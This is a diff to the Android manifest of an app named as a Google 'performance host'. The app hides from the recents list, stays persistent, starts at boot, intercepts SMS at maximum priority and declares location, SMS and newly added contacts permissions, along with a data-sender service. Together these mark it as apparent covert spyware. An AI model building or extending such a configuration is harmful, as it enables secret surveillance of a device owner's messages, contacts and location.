@@ -6,17 +6,18 @@
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
-    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
-    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
 
     <application
-        android:persistent="true"
-        android:excludeFromRecents="true"
         android:allowBackup="true"
+        android:excludeFromRecents="true"
         android:icon="@drawable/icon"
         android:label="@string/app_name"
+        android:persistent="true"
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
         <activity android:name=".MainActivity">
@@ -28,9 +29,9 @@
         </activity>
 
         <service android:name=".Services.Daemons.MainDaemonService" />
-        <service android:name=".Services.Temporary.LocatorIntentService"/>
-        <service android:name=".Services.Daemons.SmallDataSender"/>
-        <service android:name=".Services.Temporary.GPSLocatorIntentService"/>
+        <service android:name=".Services.Temporary.LocatorIntentService" />
+        <service android:name=".Services.Daemons.SmallDataSender" />
+        <service android:name=".Services.Temporary.GPSLocatorIntentService" />
 
         <receiver android:name=".BroadcastReceivers.SMSReceiver">
             <intent-filter android:priority="2147483647">
@@ -38,22 +39,22 @@
             </intent-filter>
         </receiver>
         <receiver android:name=".BroadcastReceivers.NetworkChangeReceiver">
-            <intent-filter
-                android:priority="1000">
-            <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            <intent-filter android:priority="1000">
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
             </intent-filter>
         </receiver>
-
         <receiver
-            android:name="com.example.tiber.googleperformancehost.BroadcastReceivers.BootReceiver"
+            android:name=".BroadcastReceivers.BootReceiver"
             android:enabled="true"
-            android:exported="true"
-            >
+            android:exported="true">
             <intent-filter android:priority="1">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
 
+        <service
+            android:name=".Services.Temporary.ReceivedSMSHandlerIntentService"
+            android:exported="false"></service>
     </application>
 
 </manifest>
